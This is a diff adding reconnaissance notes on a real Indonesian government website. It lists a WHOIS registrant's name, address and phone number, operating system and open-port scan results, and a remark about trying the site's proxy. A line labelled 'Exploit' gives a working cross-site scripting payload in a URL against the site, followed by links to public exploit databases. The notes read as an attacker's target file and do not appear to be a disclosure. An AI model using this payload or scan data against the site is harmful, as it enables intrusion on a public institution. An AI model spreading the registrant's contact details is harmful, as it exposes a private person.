@@ -16,6 +16,38 @@ Cipher: Aes256 256bits
 Hash Algorithm: Sha1 160bits
 Key Exchange: ECDHE_RSA (0xae06) 256bits
 
+#####revolusimental.go.id######
+Registrant ID:				achmad-1322
+Registrant Name:			Achmad Gunawan
+Registrant Organization:		Kemenko PMK
+Registrant Street1:			Jl. Medan Merdeka barat No. 3
+Registrant City:			Jakarta Pusat
+Registrant State/Province:	DKI Jakarta
+Registrant Postal Code:		10110
+Registrant Country:			ID
+Registrant Phone:			+62.8158963087
+Registrant Email:  			@kemenkopmk.go.id
+-----------------------------------------------------------------------------------
+Running: Linux 2.6.X|3.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
+OS details: Linux 2.6.32 - 3.10, Linux 3.2 - 3.10
+
+53/tcp   open  domain   MikroTik RouterOS named or OpenDNS Updater
+80/tcp   open  http     -nginx
+SSL -> CLoudFlare Nginx
+
+http://104.20.31.59/cfg?page=dhcp_server | Error 1003
+I have tested to user proxy from revolusi mental site, 104.20.31.59:8080
+
+http://revolusimental.go.id:8443/ --> Bad Request (400)
+
+Exploit :
+http://revolusimental.go.id/ajax/modal-dialog.html?id=id=%22%20onmouseover%3dprompt%28911011%29%20bad%3d%22&type=vimeo
+
+https://www.exploit-db.com/exploits/14814/
+http://0day.today/exploit/14601
+
+
 
 
 
